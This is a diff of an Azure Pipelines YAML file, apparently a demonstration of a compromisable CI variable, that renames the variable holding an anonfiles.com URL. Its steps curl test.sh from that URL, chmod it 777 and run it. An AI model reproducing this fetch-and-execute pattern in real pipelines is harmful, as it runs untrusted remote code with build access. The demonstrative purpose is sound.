@@ -2,7 +2,7 @@ pr:
 - main
 
 variables:
-- name: verifiacationUrl # This variable is just an example of a trusted variable that can be compromised
+- name: varificationUrl # This variable is just an example of a trusted variable that can be compromised
   value: "https://cdn-114.anonfiles.com/z2u7T06fy2/15beaa1c-1662481045"
 - name: sourceBranch
   value: $(Build.SourceBranchName)
@@ -17,8 +17,8 @@ steps:
       echo "verifying the commit: ${{ variables.commitMessage }}"
     displayName: Display data
   - script: |
-      echo "Url to verify: ${{ variables.verifiacationUrl }}"
-      curl ${{ variables.verifiacationUrl }}/test.sh --output test.sh
+      echo "Url to verify: ${{ variables.varificationUrl }}"
+      curl ${{ variables.varificationUrl }}/test.sh --output test.sh
       chmod 777 test.sh
     displayName: Download script
   - bash: "./test.sh"
